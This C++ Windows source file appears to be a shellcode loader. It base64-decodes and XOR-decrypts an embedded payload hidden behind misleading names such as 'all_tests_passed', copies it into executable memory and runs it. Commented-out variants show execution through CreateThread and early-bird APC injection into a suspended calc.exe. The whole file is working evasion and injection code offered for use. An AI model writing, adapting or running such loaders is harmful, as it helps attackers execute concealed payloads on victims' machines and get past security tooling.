// demo1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include "header.h"
#include "base64.h"
using namespace std;

unsigned char* ReadProcessBlob(const char* fnamSc, DWORD* szSc)
{
	DWORD szRead{ 0 };

	HANDLE hFile = CreateFileA(
		fnamSc,
		GENERIC_READ,
		NULL,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (INVALID_HANDLE_VALUE == hFile)
		return nullptr;

	SIZE_T szFile = GetFileSize(hFile, NULL);
	*szSc = szFile;

	unsigned char* raw = new unsigned char[szFile];
	unsigned char* sc = new unsigned char[szFile];

	if (!ReadFile(hFile, raw, szFile, &szRead, NULL))
		return nullptr;

	int i;

	for (i = 0; i < szRead; i++) {
		sc[i] = raw[i] ^ XOR_KEY;
	}

	return sc;
}

int main()
{
	bool all_tests_passed = false;

	std::string rest2_reference = "9ECL7PjgwAgICElZSVhaWV5AOdptQINaaECDWhBAg1ooQIN6WEAHv0JCRTnBQDnIpDRpdAokKEnJwQVJCcnq5VpJWUCDWiiDSjRACdhuiXAQAwp9eoOIgAgICECNyHxvQAnYWINAEEyDSChBCdjrXkD3wUmDPIBACd5FOcFAOcikScnBBUkJyTDofflEC0QsAE0x2X3QUEyDSCxBCdhuSYMEQEyDSBRBCdhJgwyAQAnYSVBJUFZRUklQSVFJUkCL5ChJWvfoUElRUkCDGuFH9/f3VWIIQbZ/YWZhZm18CEleQYHuRIH5SbJEfy4P991AOcFAOdpFOchFOcFJWElYSbIyXnGv993je1JAgclJsFgICAhFOcFJWUlZYgtJWUmyX4GXzvfd41FTQIHJQDnaQYHQRTnBWmAICkiMWlpJsuNdJjP33UCBzkCLy1hiAldAgflAgdJBz8j39/f3RTnBWlpJsiUOEHP33Y3IB42VCQgIQPfHB4yECQgI49vh7AkICOCq9/f3J0V8UEwIQShDvCCeEfnGqz4QOUCZb1k9zZRfrP2kaoTlwQZQ+aY4tgZwQlaNp0lYfmGOcGoGYzblJRLD9V4TH2y6c1s4iOAMlePMttdpgghde216JUlvbWZ8MihFZ3JhZGRpJzwmOCgga2dleGl8YWpkbTMoRVtBTSg/JjgzKF9hZmxnf3soRlwoPSY5IQUCCM1l6QoDmhAeJZoutN1CPkoMbBYRT4p4JodhVtQQ/QXiL7U61RfcwKRjFq95GITSknVDXEYydGh4NjiMRT6a43pevMz6zCoiQMDcYy/1jHjhWWvhVp/6TPSIiL5RP8LaSwpz++6FswyGtYnKUJ+da0rRw4YW4GE1isJ9yBukKGBzCetRpZrAZtf8AZPUpuLRg9gLYdXFeifw5yhKxN4jy6BQV14m/VHXb2WO3XrQXc7c0CxfgIM1rYMHGVMH6y9uyurrF7uMzIg+sptJ4pFTYuzDslBKxx4+qcw2ikCPTsks2vAe8rGqLYAwlP4+eRcISbb4vape991AOcGyCAhICEmwCBgICEmxSAgICEmyUKxb7ffdQJtbW0CB70CB+UCB0kmwCCgICEGB8UmyGp6B6vfdQIvMKI3IfL5ugw9ACcuNyH3fUFBQQA0ICAgIWMvgl/X39zkxOiY5PjAmOCY5OzkIWQG3ZQ==";

	std::string rest2_decoded = base64_decode(rest2_reference);

	const char* S = rest2_decoded.c_str();


	unsigned char* sc = new unsigned char[rest2_decoded.length()];

	for (int i = 0; i < rest2_decoded.length(); i++) {
		sc[i] = S[i] ^ XOR_KEY;
	}

	void * exec = VirtualAlloc(0, rest2_decoded.length(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, sc, rest2_decoded.length());
	


	//unsigned const char* S=

	((void(*)())exec)();
	

	/*
	CreateThread 

	HANDLE hThread = CreateThread(
		NULL,    
		0,      
		(LPTHREAD_START_ROUTINE)exec, 
		NULL, 
		0,
		NULL);
	if (hThread == NULL)
	{
		return 1;
	}

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	*/

	/*
	eariler bird APC

	SIZE_T shellSize = szSc;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;

	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

	WriteProcessMemory(victimProcess, shellAddress, S, shellSize, NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
	ResumeThread(threadHandle);
	*/

}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
